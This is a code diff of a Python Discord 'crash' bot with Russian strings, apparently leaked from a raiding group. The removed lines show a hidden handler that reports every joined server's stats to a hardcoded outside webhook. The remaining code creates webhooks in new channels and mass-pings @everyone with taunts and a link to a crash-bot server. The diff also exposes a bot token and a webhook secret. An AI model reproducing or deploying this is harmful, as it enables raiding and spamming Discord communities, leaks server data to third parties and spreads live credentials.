@@ -55,33 +55,7 @@ async def go(ctx):
            pass
         
 
-@bot.event
-async def on_guild_join(guild):
-        hookj = {
-          "username": "[хакер бот]",
-          "avatar_url": "https://images.discordapp.net/avatars/568698045412409344/0638bb9d234154025e9c31ed7a882126.png?size=512",
-          "content": "",
-          "embeds": [
-            {
-              "title": "*НОВЫЙ КРАШ*",
-              "color": 31743,
-              "description": f"***Кол-во участников***: {guild.member_count}👔 \n\n***Кол-во ролей***: {len(guild.roles)} 📕\n\n***Кол-во каналов***: {len(guild.text_channels)} 🌠\n\n ***КРАШНУТО:*** {guild}", 
-               "timestamp": "", 
-              "author": {
-                "name": "-хакер бот-"
-              },
-              "image": {},
-              "thumbnail": {
-                "url": f"{guild.icon_url}"
-              },
-              "footer": {},
-              "fields": []
-            }
-          ],
-          "components": []
-        }
-        hook = 'https://discord.com/api/webhooks/922765691780755468/O9xQfkL2KNxhVw4M791JsVxgkbwWfqzAdKKxCOUtJCUeW8YXJ4ub9rLelTiSqdiQKrsc'
-        requests.post(hook, json=hookj)
+
 @bot.event
 async def on_guild_channel_create(channel):
     webhook = await channel.create_webhook(name = "Crash By HACKER BOT")
@@ -93,7 +67,7 @@ async def on_guild_channel_create(channel):
           await webhook.send("@everyone лохи крашнуты или мне кажется??  Ссылка на дискорд сервер с краш ботами https://discord.gg/dTyhdnUFVu 🙈", tts=True)
         except:
           pass       
-token = 'OTI5NzE0Nzc0MTgxMzE0NjUx.YdrWWw.UcowqW9rMtWqDq4VZ7btdc6NCvI'
+token = open("token.txt").read()
 bot.run(token)
 # слито by t.me/protectcheck
 # слито by discord.gg/fzlgroup2
